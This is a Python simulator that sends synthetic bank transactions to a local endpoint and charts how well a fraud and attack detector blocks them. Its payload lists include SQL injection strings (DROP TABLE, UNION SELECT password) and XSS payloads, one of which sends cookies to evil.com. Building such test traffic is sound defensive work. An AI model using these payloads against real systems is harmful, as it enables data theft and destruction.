#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import uuid
import os
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import List, Dict
import numpy as np
from scipy import stats
import argparse
import matplotlib.pyplot as plt

TARGET_URL = "http://127.0.0.1:5001/receive"
NUM_USERS = 100
NUM_TRANSACTIONS = 30000
SIMULATION_HOURS = 24

class AnomalyType:
    NORMAL = 0
    SQL_INJECTION = 1
    XSS = 2
    FRAUD_VELOCITY = 3
    FRAUD_AMOUNT = 4
    FRAUD_GEO = 5
    FRAUD_TIME = 6
    DDOS = 7
    BRUTE_FORCE = 8
    
    @classmethod
    def from_string(cls, attack_type: str) -> int:
        mapping = {
            "normal": cls.NORMAL, "sql_injection": cls.SQL_INJECTION, "xss": cls.XSS,
            "fraud_velocity": cls.FRAUD_VELOCITY, "fraud_amount_anomaly": cls.FRAUD_AMOUNT,
            "fraud_geo_anomaly": cls.FRAUD_GEO, "fraud_time_anomaly": cls.FRAUD_TIME,
            "ddos": cls.DDOS, "brute_force": cls.BRUTE_FORCE,
        }
        return mapping.get(attack_type, cls.NORMAL)

RUSSIAN_LABELS = {
    "sql_injection": "SQL-инъекция", "xss": "XSS-атака",
    "fraud_velocity": "Частотная\nаномалия", "fraud_amount_anomaly": "Аномалия\nсуммы",
    "fraud_geo_anomaly": "Гео-\nаномалия", "normal": "Норма",
}

@dataclass
class User:
    user_id: str
    name: str
    account_number: str
    balance: float
    risk_score: float
    typical_amount_mean: float
    typical_amount_std: float
    active_hours: tuple

class UserGenerator:
    FIRST_NAMES = ["Иван", "Петр", "Алексей", "Мария", "Елена", "Ольга", "Дмитрий", "Анна", "Сергей", "Наталья"]
    LAST_NAMES = ["Иванов", "Петров", "Сидоров", "Козлов", "Новиков", "Морозов", "Волков", "Соколов", "Лебедев", "Кузнецов"]
    
    @staticmethod
    def generate_users(count: int) -> List[User]:
        users = []
        for i in range(count):
            name = f"{random.choice(UserGenerator.FIRST_NAMES)} {random.choice(UserGenerator.LAST_NAMES)}"
            users.append(User(
                user_id=f"USR-{i+1:05d}", name=name,
                account_number=f"4081781000{random.randint(10000000, 99999999)}",
                balance=random.uniform(10000, 5000000), risk_score=random.betavariate(2, 8),
                typical_amount_mean=random.uniform(1000, 50000),
                typical_amount_std=random.uniform(500, 10000),
                active_hours=(random.randint(8, 10), random.randint(18, 22))
            ))
        return users

class DistributionType:
    POISSON = "poisson"
    PARETO = "pareto"
    EXPONENTIAL = "exponential"
    
    @classmethod
    def all(cls) -> List[str]:
        return [cls.POISSON, cls.PARETO, cls.EXPONENTIAL]
    
    @classmethod
    def to_russian(cls, dist_type: str) -> str:
        return {"poisson": "Пуассон", "pareto": "Парето", "exponential": "Экспоненц."}.get(dist_type, dist_type)

class TransactionDistribution:
    @staticmethod
    def daily_activity_distribution(hour: int) -> float:
        primary = stats.norm.pdf(hour, loc=13, scale=2.5)
        secondary = stats.norm.pdf(hour, loc=19, scale=2) * 0.6
        morning = stats.norm.pdf(hour, loc=10, scale=1.5) * 0.4
        return primary + secondary + morning
    
    @staticmethod
    def generate_transaction_times(num_transactions: int, base_date: datetime) -> List[datetime]:
        times = []
        hour_weights = [TransactionDistribution.daily_activity_distribution(h) for h in range(24)]
        total_weight = sum(hour_weights)
        hour_probs = [w / total_weight for w in hour_weights]
        for _ in range(num_transactions):
            hour = np.random.choice(24, p=hour_probs)
            tx_time = base_date.replace(hour=hour, minute=random.randint(0, 59),
                                        second=random.randint(0, 59), microsecond=random.randint(0, 999999))
            times.append(tx_time)
        return sorted(times)
    
    @staticmethod
    def generate_anomaly_time(base_date: datetime, duration_hours: int, distribution: str) -> datetime:
        if distribution == DistributionType.POISSON:
            seconds = random.uniform(0, duration_hours * 3600)
        elif distribution == DistributionType.EXPONENTIAL:
            scale = duration_hours * 3600 / 3
            seconds = min(np.random.exponential(scale), duration_hours * 3600 - 1)
        elif distribution == DistributionType.PARETO:
            pareto_val = (np.random.pareto(1.5) + 1)
            seconds = min(pareto_val * 1000, duration_hours * 3600 - 1)
        else:
            seconds = random.uniform(0, duration_hours * 3600)
        return base_date + timedelta(seconds=seconds)

class AttackGenerator:
    SQL_INJECTIONS = ["' OR '1'='1' --", "'; DROP TABLE transactions; --", "' UNION SELECT * FROM users --",
                      "1; UPDATE accounts SET balance=999999 WHERE user_id='", "' AND 1=1 UNION SELECT password FROM users --"]
    XSS_PAYLOADS = ["<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                   "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", "javascript:alert(document.domain)"]
    
    @staticmethod
    def generate_sql_injection(transaction: Dict) -> Dict:
        transaction["description"] = random.choice(AttackGenerator.SQL_INJECTIONS)
        transaction["attack_type"] = "sql_injection"
        transaction["anomaly_code"] = AnomalyType.SQL_INJECTION
        transaction["is_malicious"] = True
        return transaction
    
    @staticmethod
    def generate_xss(transaction: Dict) -> Dict:
        transaction["description"] = random.choice(AttackGenerator.XSS_PAYLOADS)
        transaction["attack_type"] = "xss"
        transaction["anomaly_code"] = AnomalyType.XSS
        transaction["is_malicious"] = True
        return transaction
    
    @staticmethod
    def generate_fraud(transaction: Dict, fraud_type: str) -> Dict:
        if fraud_type == "velocity":
            transaction["amount"] = random.uniform(100, 500)
            transaction["anomaly_code"] = AnomalyType.FRAUD_VELOCITY
        elif fraud_type == "amount_anomaly":
            transaction["amount"] = random.uniform(500000, 5000000)
            transaction["anomaly_code"] = AnomalyType.FRAUD_AMOUNT
        elif fraud_type == "geo_anomaly":
            transaction["location"] = {"country": "NG", "city": "Lagos", "ip": "197.210.0.1"}
            transaction["anomaly_code"] = AnomalyType.FRAUD_GEO
        elif fraud_type == "time_anomaly":
            transaction["anomaly_code"] = AnomalyType.FRAUD_TIME
        transaction["attack_type"] = f"fraud_{fraud_type}"
        transaction["is_malicious"] = True
        return transaction

class BankSimulator:
    def __init__(self, target_url: str, num_users: int, num_transactions: int):
        self.target_url = target_url
        self.num_users = num_users
        self.num_transactions = num_transactions
        self.users = UserGenerator.generate_users(num_users)
        self.session_id = f"BANK-{datetime.utcnow().strftime('%Y%m%d%H%M%S')}"
        self.stats = {
            "total_sent": 0, "total_received": 0, "total_blocked": 0,
            "malicious_sent": 0, "malicious_blocked": 0, "by_attack_type": {},
            "by_hour": {h: 0 for h in range(24)},
            "by_hour_normal": {h: 0 for h in range(24)},
            "by_hour_anomaly": {h: 0 for h in range(24)},
            "by_hour_poisson": {h: 0 for h in range(24)},
            "by_hour_pareto": {h: 0 for h in range(24)},
            "by_hour_exponential": {h: 0 for h in range(24)},
            "by_distribution": {d: 0 for d in DistributionType.all()},
            "latencies": []
        }
    
    def generate_normal_transaction(self, user: User, timestamp: datetime) -> Dict:
        receiver = random.choice([u for u in self.users if u.user_id != user.user_id])
        amount = max(100, np.random.normal(user.typical_amount_mean, user.typical_amount_std))
        return {
            "transaction_id": f"TXN-{uuid.uuid4().hex[:12].upper()}",
            "user_id": user.user_id, "sender_account": user.account_number,
            "receiver_account": receiver.account_number, "amount": round(amount, 2),
            "currency": "RUB", "timestamp": timestamp.isoformat(),
            "transaction_type": random.choice(["transfer", "payment", "withdrawal"]),
            "description": random.choice(["Перевод другу", "Оплата услуг", "Покупка товара",
                                          "Коммунальные платежи", "Пополнение счета", "Возврат долга"]),
            "ip_address": f"192.168.{random.randint(1,254)}.{random.randint(1,254)}",
            "device_fingerprint": uuid.uuid4().hex,
            "location": {"country": "RU", "city": random.choice(["Москва", "СПб", "Казань", "Новосибирск"])},
            "is_malicious": False, "attack_type": "normal", "anomaly_code": AnomalyType.NORMAL
        }

    def generate_transactions(self) -> List[Dict]:
        print(f"Generating {self.num_transactions} transactions for {self.num_users} users...")
        base_date = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
        normal_count = int(self.num_transactions * 0.85)
        attack_count = self.num_transactions - normal_count
        normal_times = TransactionDistribution.generate_transaction_times(normal_count, base_date)
        transactions = []
        for tx_time in normal_times:
            user = random.choice(self.users)
            tx = self.generate_normal_transaction(user, tx_time)
            transactions.append(tx)
        attack_types = ["sql_injection", "xss", "fraud_velocity", "fraud_amount_anomaly", "fraud_geo_anomaly"]
        distributions = DistributionType.all()
        dist_counts = {d: 0 for d in distributions}
        print(f"Generating {attack_count} anomalies with random distributions...")
        for _ in range(attack_count):
            user = random.choice(self.users)
            distribution = random.choice(distributions)
            dist_counts[distribution] += 1
            attack_time = TransactionDistribution.generate_anomaly_time(base_date, SIMULATION_HOURS, distribution)
            tx = self.generate_normal_transaction(user, attack_time)
            attack_type = random.choice(attack_types)
            if attack_type == "sql_injection":
                tx = AttackGenerator.generate_sql_injection(tx)
            elif attack_type == "xss":
                tx = AttackGenerator.generate_xss(tx)
            elif attack_type.startswith("fraud_"):
                tx = AttackGenerator.generate_fraud(tx, attack_type.replace("fraud_", ""))
            tx["distribution"] = distribution
            transactions.append(tx)
        transactions.sort(key=lambda x: x["timestamp"])
        print(f"Generated {len(transactions)} transactions:")
        print(f"  - Легитимные (норм. распр.): {normal_count}")
        print(f"  - Аномалии: {attack_count}")
        for dist, count in dist_counts.items():
            print(f"    • {DistributionType.to_russian(dist)}: {count}")
        return transactions
    
    async def send_transaction(self, session: aiohttp.ClientSession, transaction: Dict) -> Dict:
        request_data = {
            "request_id": transaction["transaction_id"], "session_id": self.session_id,
            "timestamp": datetime.utcnow().isoformat() + "Z", "is_malicious": transaction["is_malicious"],
            "attack_type": transaction["attack_type"],
            "anomaly_code": transaction.get("anomaly_code", AnomalyType.NORMAL),
            "payload": transaction,
            "headers": {"User-Agent": "BankApp/2.0", "X-Device-ID": transaction["device_fingerprint"]}
        }
        try:
            start = datetime.utcnow()
            async with session.post(self.target_url, json=request_data, timeout=10) as resp:
                elapsed = (datetime.utcnow() - start).total_seconds() * 1000
                result = await resp.json()
                return {
                    "success": True, "transaction_id": transaction["transaction_id"],
                    "attack_type": transaction["attack_type"], "is_malicious": transaction["is_malicious"],
                    "was_blocked": result.get("results", [{}])[0].get("was_blocked", False),
                    "latency_ms": elapsed, "hour": datetime.fromisoformat(transaction["timestamp"]).hour,
                    "distribution": transaction.get("distribution", None)
                }
        except Exception as e:
            return {"success": False, "transaction_id": transaction["transaction_id"],
                    "attack_type": transaction["attack_type"], "is_malicious": transaction["is_malicious"],
                    "was_blocked": False, "latency_ms": 0, "error": str(e)}

    async def run_simulation(self, rps: int = 100, batch_size: int = 50):
        transactions = self.generate_transactions()
        print(f"\n{'='*70}\nBANK TRANSACTION SIMULATION\n{'='*70}")
        print(f"Session: {self.session_id}\nTarget: {self.target_url}")
        print(f"Users: {self.num_users}\nTransactions: {len(transactions)}\nRPS: {rps}\n{'='*70}\n")
        connector = aiohttp.TCPConnector(limit=100)
        async with aiohttp.ClientSession(connector=connector) as session:
            start_time = datetime.utcnow()
            for i in range(0, len(transactions), batch_size):
                batch = transactions[i:i+batch_size]
                tasks = [self.send_transaction(session, tx) for tx in batch]
                results = await asyncio.gather(*tasks)
                for result in results:
                    self.stats["total_sent"] += 1
                    if result["success"]:
                        self.stats["total_received"] += 1
                        self.stats["latencies"].append(result["latency_ms"])
                        self.stats["by_hour"][result["hour"]] += 1
                        if result["is_malicious"]:
                            self.stats["by_hour_anomaly"][result["hour"]] += 1
                            dist = result.get("distribution")
                            if dist:
                                self.stats["by_distribution"][dist] += 1
                                if dist == DistributionType.POISSON:
                                    self.stats["by_hour_poisson"][result["hour"]] += 1
                                elif dist == DistributionType.PARETO:
                                    self.stats["by_hour_pareto"][result["hour"]] += 1
                                elif dist == DistributionType.EXPONENTIAL:
                                    self.stats["by_hour_exponential"][result["hour"]] += 1
                        else:
                            self.stats["by_hour_normal"][result["hour"]] += 1
                        if result["was_blocked"]:
                            self.stats["total_blocked"] += 1
                        if result["is_malicious"]:
                            self.stats["malicious_sent"] += 1
                            if result["was_blocked"]:
                                self.stats["malicious_blocked"] += 1
                        attack_type = result["attack_type"]
                        if attack_type not in self.stats["by_attack_type"]:
                            self.stats["by_attack_type"][attack_type] = {"sent": 0, "blocked": 0}
                        self.stats["by_attack_type"][attack_type]["sent"] += 1
                        if result["was_blocked"]:
                            self.stats["by_attack_type"][attack_type]["blocked"] += 1
                progress = (i + len(batch)) / len(transactions) * 100
                print(f"\rProgress: {progress:.1f}% ({i + len(batch)}/{len(transactions)})", end="", flush=True)
                await asyncio.sleep(batch_size / rps)
            elapsed = (datetime.utcnow() - start_time).total_seconds()
        self.print_results(elapsed)
    
    def print_results(self, elapsed: float):
        print(f"\n\n{'='*70}\nSIMULATION RESULTS\n{'='*70}")
        print(f"Duration: {elapsed:.2f}s\nThroughput: {self.stats['total_sent']/elapsed:.1f} tx/s")
        print(f"\n--- Transaction Stats ---")
        print(f"Total sent: {self.stats['total_sent']}\nTotal received: {self.stats['total_received']}")
        print(f"Total blocked: {self.stats['total_blocked']}")
        print(f"Block rate: {self.stats['total_blocked']/max(1,self.stats['total_received'])*100:.1f}%")
        if self.stats["latencies"]:
            lats = sorted(self.stats["latencies"])
            print(f"\n--- Latency (ms) ---")
            print(f"Avg: {np.mean(lats):.2f} | Min: {min(lats):.2f} | Max: {max(lats):.2f}")
            print(f"P50: {np.percentile(lats, 50):.2f} | P95: {np.percentile(lats, 95):.2f} | P99: {np.percentile(lats, 99):.2f}")
        print(f"\n--- Attack Detection ---")
        print(f"Malicious sent: {self.stats['malicious_sent']}\nMalicious blocked: {self.stats['malicious_blocked']}")
        detection_rate = self.stats['malicious_blocked']/max(1,self.stats['malicious_sent'])*100
        print(f"Detection rate: {detection_rate:.1f}%")
        normal_sent = self.stats["by_attack_type"].get("normal", {}).get("sent", 0)
        normal_blocked = self.stats["by_attack_type"].get("normal", {}).get("blocked", 0)
        fp_rate = normal_blocked/max(1,normal_sent)*100
        print(f"False positive rate: {fp_rate:.1f}%")
        print(f"\n--- By Attack Type ---")
        for attack_type, data in self.stats["by_attack_type"].items():
            rate = data["blocked"]/max(1,data["sent"])*100
            print(f"{attack_type}: sent={data['sent']}, blocked={data['blocked']} ({rate:.1f}%)")
        print(f"\n--- Hourly Distribution ---")
        max_count = max(self.stats["by_hour"].values()) if self.stats["by_hour"] else 1
        for hour in range(24):
            count = self.stats["by_hour"][hour]
            bar_len = int(count / max_count * 40)
            print(f"{hour:02d}:00 | {'█' * bar_len} {count}")
        print(f"{'='*70}")
        if detection_rate < 80:
            print(f"⚠️  WARNING: Detection rate below 80%")
        if fp_rate > 5:
            print(f"⚠️  WARNING: False positive rate above 5%")
        self.generate_charts(elapsed, detection_rate, fp_rate)

    def generate_charts(self, elapsed: float, detection_rate: float, fp_rate: float):
        plt.rcParams['font.family'] = ['DejaVu Sans', 'Arial', 'sans-serif']
        plt.style.use('seaborn-v0_8-whitegrid')
        fig = plt.figure(figsize=(16, 12))
        fig.suptitle(f'Результаты симуляции банковских транзакций\nСессия: {self.session_id}', fontsize=14, fontweight='bold')
        
        ax1 = fig.add_subplot(2, 3, 1)
        hours = list(range(24))
        normal_counts = [self.stats["by_hour_normal"][h] for h in hours]
        poisson_counts = [self.stats["by_hour_poisson"][h] for h in hours]
        pareto_counts = [self.stats["by_hour_pareto"][h] for h in hours]
        exp_counts = [self.stats["by_hour_exponential"][h] for h in hours]
        bottom1 = normal_counts
        bottom2 = [n + p for n, p in zip(normal_counts, poisson_counts)]
        bottom3 = [b + pa for b, pa in zip(bottom2, pareto_counts)]
        ax1.bar(hours, normal_counts, color='#2ecc71', edgecolor='white', linewidth=0.5, label='Легитимные (норм.)')
        ax1.bar(hours, poisson_counts, bottom=normal_counts, color='#e74c3c', edgecolor='white', linewidth=0.5, label='Аномалии (Пуассон)')
        ax1.bar(hours, pareto_counts, bottom=bottom2, color='#9b59b6', edgecolor='white', linewidth=0.5, label='Аномалии (Парето)')
        ax1.bar(hours, exp_counts, bottom=bottom3, color='#f39c12', edgecolor='white', linewidth=0.5, label='Аномалии (Экспон.)')
        ax1.set_xlabel('Время суток')
        ax1.set_ylabel('Количество транзакций')
        ax1.set_title('Распределение транзакций за 24 часа\n(4 математических модели)')
        ax1.set_xticks(range(0, 24, 2))
        ax1.set_xticklabels([f'{h:02d}:00' for h in range(0, 24, 2)], rotation=45)
        ax1.legend(loc='upper left', fontsize=6)
        ax1_twin = ax1.twinx()
        x_smooth = np.linspace(0, 23, 100)
        y_normal = [TransactionDistribution.daily_activity_distribution(h) for h in x_smooth]
        max_normal = max(normal_counts) if max(normal_counts) > 0 else 1
        y_normal = np.array(y_normal) / max(y_normal) * max_normal * 0.8
        ax1_twin.plot(x_smooth, y_normal, 'g--', linewidth=2, alpha=0.7, label='Теор. норм.')
        lambda_rate = sum(poisson_counts) / 24 if sum(poisson_counts) > 0 else 0.5
        ax1_twin.axhline(y=lambda_rate, color='red', linestyle=':', linewidth=1.5, alpha=0.7, label=f'Пуассон λ={lambda_rate:.1f}')
        ax1_twin.set_ylabel('Теор. распределение', color='gray', fontsize=8)
        ax1_twin.tick_params(axis='y', labelcolor='gray')
        ax1_twin.legend(loc='upper right', fontsize=6)
        
        ax2 = fig.add_subplot(2, 3, 2)
        attack_types = list(self.stats["by_attack_type"].keys())
        sent_counts = [self.stats["by_attack_type"][t]["sent"] for t in attack_types]
        blocked_counts = [self.stats["by_attack_type"][t]["blocked"] for t in attack_types]
        x_pos = np.arange(len(attack_types))
        width = 0.35
        ax2.bar(x_pos - width/2, sent_counts, width, label='Отправлено', color='#3498db')
        ax2.bar(x_pos + width/2, blocked_counts, width, label='Заблокировано', color='#e74c3c')
        ax2.set_xlabel('Тип аномалии')
        ax2.set_ylabel('Количество')
        ax2.set_title('Детекция по типам аномалий')
        ax2.set_xticks(x_pos)
        ax2.set_xticklabels([RUSSIAN_LABELS.get(t, t) for t in attack_types], rotation=0, fontsize=8)
        ax2.legend()
        for i, (s, b) in enumerate(zip(sent_counts, blocked_counts)):
            ax2.annotate(f'{b/max(1,s)*100:.0f}%', xy=(i, max(s, b)), ha='center', va='bottom', fontsize=8)

        ax3 = fig.add_subplot(2, 3, 3)
        metrics = ['Детекция\n(%)', 'Ложные\nсрабатывания', 'Блокировка\n(%)', 'Пропускная\nспособность']
        values = [detection_rate, fp_rate, self.stats['total_blocked']/max(1,self.stats['total_received'])*100, self.stats['total_sent']/elapsed]
        colors = ['#2ecc71' if detection_rate >= 80 else '#e74c3c', '#2ecc71' if fp_rate <= 5 else '#e74c3c', '#3498db', '#9b59b6']
        bars = ax3.bar(metrics, values, color=colors, edgecolor='white', linewidth=2)
        ax3.set_ylabel('Значение')
        ax3.set_title('Ключевые метрики эффективности')
        ax3.axhline(y=80, color='green', linestyle='--', alpha=0.5)
        ax3.axhline(y=5, color='red', linestyle='--', alpha=0.5)
        for bar, val in zip(bars, values):
            ax3.annotate(f'{val:.1f}', xy=(bar.get_x() + bar.get_width()/2, bar.get_height()), ha='center', va='bottom', fontweight='bold')
        
        ax4 = fig.add_subplot(2, 3, 4)
        if self.stats["latencies"]:
            lats = self.stats["latencies"]
            ax4.hist(lats, bins=50, color='#3498db', edgecolor='white', alpha=0.7)
            ax4.axvline(np.mean(lats), color='red', linestyle='--', linewidth=2, label=f'Среднее: {np.mean(lats):.1f}мс')
            ax4.axvline(np.percentile(lats, 95), color='orange', linestyle='--', linewidth=2, label=f'P95: {np.percentile(lats, 95):.1f}мс')
            ax4.axvline(np.percentile(lats, 99), color='purple', linestyle='--', linewidth=2, label=f'P99: {np.percentile(lats, 99):.1f}мс')
            ax4.set_xlabel('Задержка (мс)')
            ax4.set_ylabel('Частота')
            ax4.set_title('Распределение времени отклика')
            ax4.legend(fontsize=8)
        
        ax5 = fig.add_subplot(2, 3, 5)
        x_range = np.linspace(0, 10, 200)
        y_norm = stats.norm.pdf(x_range, loc=5, scale=1.5)
        ax5.plot(x_range, y_norm, 'g-', linewidth=2, label='Нормальное (время транзакций)')
        ax5.fill_between(x_range, y_norm, alpha=0.3, color='green')
        y_exp = stats.expon.pdf(x_range, scale=2)
        ax5.plot(x_range, y_exp, 'r-', linewidth=2, label='Экспоненциальное (интервалы атак)')
        ax5.fill_between(x_range, y_exp, alpha=0.3, color='red')
        y_pareto = stats.pareto.pdf(x_range, b=2.0)
        ax5.plot(x_range, y_pareto, 'b-', linewidth=2, label='Парето (интенсивность атак)')
        ax5.fill_between(x_range, y_pareto, alpha=0.3, color='blue')
        ax5.set_xlabel('Значение')
        ax5.set_ylabel('Плотность вероятности')
        ax5.set_title('Математические модели распределений')
        ax5.legend(fontsize=8, loc='upper right')
        ax5.set_xlim(0, 10)
        ax5.set_ylim(0, 1)
        
        ax6 = fig.add_subplot(2, 3, 6)
        attack_map = {'sql_injection': 'SQL-инъекция', 'xss': 'XSS-атака', 'fraud_velocity': 'Частотная аномалия',
                      'fraud_amount_anomaly': 'Аномалия суммы', 'fraud_geo_anomaly': 'Гео-аномалия'}
        detection_rates = []
        labels_list = []
        for key, label in attack_map.items():
            data = self.stats["by_attack_type"].get(key, {"sent": 0, "blocked": 0})
            rate = data["blocked"] / max(1, data["sent"]) * 100
            detection_rates.append(rate)
            labels_list.append(f"{label}\n(код: {AnomalyType.from_string(key)})")
        colors = ['#2ecc71' if r >= 80 else '#e74c3c' for r in detection_rates]
        bars = ax6.barh(labels_list, detection_rates, color=colors, edgecolor='white')
        ax6.set_xlabel('Уровень детекции (%)')
        ax6.set_title('Детекция по типам аномалий\n(с кодами для БД)')
        ax6.axvline(x=80, color='green', linestyle='--', alpha=0.7)
        ax6.set_xlim(0, 110)
        for bar, rate in zip(bars, detection_rates):
            ax6.annotate(f'{rate:.0f}%', xy=(rate + 2, bar.get_y() + bar.get_height()/2), va='center', fontweight='bold', fontsize=9)
        
        plt.tight_layout(rect=[0, 0.03, 1, 0.95])
        output_dir = "reports"
        os.makedirs(output_dir, exist_ok=True)
        filename = f"{output_dir}/simulation_{self.session_id}.png"
        plt.savefig(filename, dpi=150, bbox_inches='tight', facecolor='white')
        print(f"\n📊 Графики сохранены: {filename}")
        plt.show()

async def main():
    parser = argparse.ArgumentParser(description="Bank Transaction Simulator")
    parser.add_argument("--users", type=int, default=100)
    parser.add_argument("--transactions", type=int, default=30000)
    parser.add_argument("--rps", type=int, default=100)
    parser.add_argument("--target", type=str, default=TARGET_URL)
    args = parser.parse_args()
    simulator = BankSimulator(args.target, args.users, args.transactions)
    await simulator.run_simulation(rps=args.rps)

if __name__ == "__main__":
    asyncio.run(main())
